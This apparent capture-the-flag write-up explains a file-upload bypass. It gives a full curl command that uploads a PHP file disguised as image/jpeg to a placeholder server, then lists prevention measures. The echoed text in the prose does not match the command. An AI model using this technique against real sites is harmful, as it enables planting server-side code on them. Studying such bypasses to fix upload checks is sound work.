# File Upload Issue

When you upload a file, there is a risk. A PHP file might be uploaded pretending to be an image. The attack involves making a PHP script (/tmp/bad.php) with this content <?php echo "This is a poor upload check..." ?>. To get past security, this file is uploaded using curl with the 'Content-Type' header set as 'image/jpeg'. The command for this is:
Here's the command that accomplishes this:
```bash
echo '<?php echo "The Gang à Rossa!" ?>' > /tmp/bad.php && curl -X POST -F "Upload=Upload" -F "uploaded=@/tmp/bad.php;type=image/jpeg" "http://x.x.x.x/index.php?page=upload" | grep flag
```

## Prevention

Enhance security by not solely trusting 'Content-Type' headers, renaming files, restricting file types, and checking file sizes and permissions.